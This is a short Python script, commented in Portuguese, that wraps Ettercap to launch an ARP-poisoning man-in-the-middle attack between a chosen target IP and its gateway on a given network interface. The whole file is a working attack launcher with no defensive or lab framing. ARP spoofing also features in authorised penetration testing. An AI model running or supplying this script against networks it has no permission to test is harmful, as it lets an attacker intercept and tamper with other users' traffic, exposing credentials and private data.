import subprocess

def run_ettercap(target_ip, gateway_ip, interface):
    try:
        # Construir o comando do Ettercap
        command = [
            "ettercap",
            "-T",  # Modo texto
            "-M", "arp",  # Modo ARP poisoning
            f"/{target_ip}//",  # Endereço IP do alvo
            f"/{gateway_ip}//",  # Endereço IP do gateway
            "-i", interface  # Interface de rede
        ]

        # Executar o Ettercap
        print("Iniciando o Ettercap...")
        subprocess.run(command, check=True)

    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar o Ettercap: {e}")
    except Exception as e:
        print(f"Erro inesperado: {e}")
    finally:
        print("Ettercap finalizado.")